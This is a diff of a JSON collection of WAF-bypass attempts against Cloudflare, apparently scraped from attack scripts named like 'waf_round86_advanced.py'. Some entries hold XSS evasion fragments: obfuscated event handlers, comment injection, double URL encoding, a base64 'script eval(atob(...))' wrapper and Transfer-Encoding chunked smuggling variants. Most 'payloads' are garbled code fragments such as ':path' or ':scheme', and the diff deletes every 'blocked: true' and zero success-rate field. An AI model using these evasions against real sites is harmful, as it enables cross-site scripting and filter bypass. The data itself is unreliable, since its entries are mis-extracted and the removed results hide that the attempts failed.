-      "subcategory": "general",
-      "payload": ":path",
-      "description": "/",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0646",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0647",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":authority', HOST),\n            ('content-type",
-      "description": "application/x-www-form-urlencoded",
-      "technique": "encoding",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0649",
@@ -4099,123 +2191,7 @@
       "description": "https",
       "technique": "direct_injection",
       "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0651",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path",
-      "description": "/",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0652",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0654",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path",
-      "description": "/",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0655",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0657",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path",
-      "description": "/",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0658",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0659",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":authority', HOST),\n            ('content-type",
-      "description": "application/json",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0661",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path",
-      "description": "/?safe=1",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0662",
@@ -4225,25 +2201,7 @@
       "description": "https",
       "technique": "direct_injection",
       "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0664",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path', f'/?globalHtml={enc}'),\n                (':scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0665",
@@ -4253,123 +2211,7 @@
       "description": "value",
       "technique": "direct_injection",
       "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0666",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":method",
-      "description": "POST",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0667",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path",
-      "description": "/",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0668",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0669",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":method",
-      "description": "GET",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0670",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path', f'/?attributeHtml={enc}'),\n            (':scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0679",
-      "category": "other",
-      "subcategory": "general",
-      "payload": " on",
-      "description": " oNLy=1 on', 1) if ' on' in p else p,\n    # Fake attribute prefix\n    lambda p: p.replace(' on', ' onx=() on', 1) if ' on' in p else p,\n    # Add comment\n    lambda p: p.replace('=', '=<!-->', 1),\n    # Double URL encode\n    lambda p: urllib.parse.quote(p),\n    # Base64 wrap\n    lambda p: f'<script>eval(atob(\"{base64.b64encode(p.encode()).decode()}",
-      "technique": "encoding",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0681",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path",
-      "description": "/",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0682",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0684",
@@ -4379,39 +2221,7 @@
       "description": " chunked', 'chunked ', '\\tchunked', 'Chunked', 'CHUNKED',\n    'chunked\\x00', 'chunked; ext=val',\n]\nfor te in TE_VARIANTS:\n    for xss in [XSS_S]:\n        enc = urllib.parse.quote(xss, safe='",
       "technique": "direct_injection",
       "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0686",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":method",
-      "description": "GET",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0687",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path', f'/?attributeHtml={enc}'),\n            (':scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round86_advanced.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0688",
@@ -4421,25 +2231,7 @@
       "description": "'] and '<input' not in div[:20]:\n                print(f\"    DIV: {div[:200]}",
       "technique": "direct_injection",
       "source_file": "waf_round64_gap_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0691",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "on}x=1",
-      "description": "gap-}x",
-      "technique": "direct_injection",
-      "source_file": "waf_round64_gap_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0692",
@@ -4449,53 +2241,7 @@
       "description": "gap-:x",
       "technique": "direct_injection",
       "source_file": "waf_round64_gap_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0693",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "on{focus=1",
-      "description": "gap-{focus",
-      "technique": "direct_injection",
-      "source_file": "waf_round64_gap_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0694",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "on{load=1",
-      "description": "gap-{load",
-      "technique": "direct_injection",
-      "source_file": "waf_round64_gap_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0695",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "on{error=1",
-      "description": "gap-{error",
-      "technique": "direct_injection",
-      "source_file": "waf_round64_gap_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0701",
@@ -4505,11 +2251,7 @@
       "description": "tab-onfocus",
       "technique": "direct_injection",
       "source_file": "waf_round64_gap_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0702",
@@ -4519,11 +2261,7 @@
       "description": "nl-onfocus",
       "technique": "direct_injection",
       "source_file": "waf_round64_gap_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0703",
@@ -4533,11 +2271,7 @@
       "description": "cr-onfocus",
       "technique": "direct_injection",
       "source_file": "waf_round64_gap_deep.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0709",
@@ -4547,123 +2281,7 @@
       "description": "X-Method-Override', 'X-HTTP-Method",
       "technique": "direct_injection",
       "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0710",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":method",
-      "description": "POST",
-      "technique": "direct_injection",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0711",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path', f'/?globalHtml={enc}'),\n                (':scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0713",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path', f'/?globalHtml={enc}'),\n            (':scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0715",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":method",
-      "description": "POST",
-      "technique": "direct_injection",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0716",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path",
-      "description": "/",
-      "technique": "direct_injection",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0717",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0719",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":method",
-      "description": "GET",
-      "technique": "direct_injection",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0720",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path', f'/?globalHtml={enc}'),\n                (':scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0721",
@@ -4673,11 +2291,7 @@
       "description": "text/html",
       "technique": "direct_injection",
       "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0722",
@@ -4687,81 +2301,7 @@
       "description": "en-US",
       "technique": "direct_injection",
       "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0723",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":method",
-      "description": "GET",
-      "technique": "direct_injection",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0724",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path",
-      "description": "/",
-      "technique": "direct_injection",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0725",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0729",
-      "category": "other",
-      "subcategory": "general",
-      "payload": " on",
-      "description": " oNLy=1 on', 1) if ' on' in p else p,\n    lambda p: urllib.parse.quote(p),\n    lambda p: f'<script>eval(atob(\"{base64.b64encode(p.encode()).decode()}",
-      "technique": "encoding",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0733",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "text/plain",
-      "description": "urlencoded",
-      "technique": "encoding",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0734",
@@ -4771,11 +2311,7 @@
       "description": "urlencoded",
       "technique": "encoding",
       "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0735",
@@ -4785,11 +2321,7 @@
       "description": "urlencoded",
       "technique": "encoding",
       "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0736",
@@ -4799,39 +2331,7 @@
       "description": "json",
       "technique": "direct_injection",
       "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0737",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "text/plain",
-      "description": "json",
-      "technique": "direct_injection",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0738",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "text/html",
-      "description": "json",
-      "technique": "direct_injection",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0739",
@@ -4841,25 +2341,7 @@
       "description": "urlencoded",
       "technique": "encoding",
       "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0740",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "application/x-www-form-urlencoded",
-      "description": "multipart",
-      "technique": "direct_injection",
-      "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0741",
@@ -4869,123 +2351,7 @@
       "description": "multipart",
       "technique": "direct_injection",
       "source_file": "waf_round87_advanced2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0745",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path',f'/?globalHtml={enc}'),(':scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0747",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path",
-      "description": "/",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0748",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0749",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":authority',HOST),\n                ('content-type",
-      "description": "application/x-www-form-urlencoded",
-      "technique": "encoding",
-      "source_file": "waf_round90_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0751",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path",
-      "description": "/",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0752",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0753",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":authority',HOST),\n                ('content-type",
-      "description": "application/json",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0754",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path',f'/?globalHtml={enc}'),(':scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round90_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0755",
@@ -4995,11 +2361,7 @@
       "description": "https",
       "technique": "direct_injection",
       "source_file": "waf_round90_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     }
   ],
   "description": "HTTP protocol attacks, encoding experiments, and hybrid techniques that don't fit standard categories"
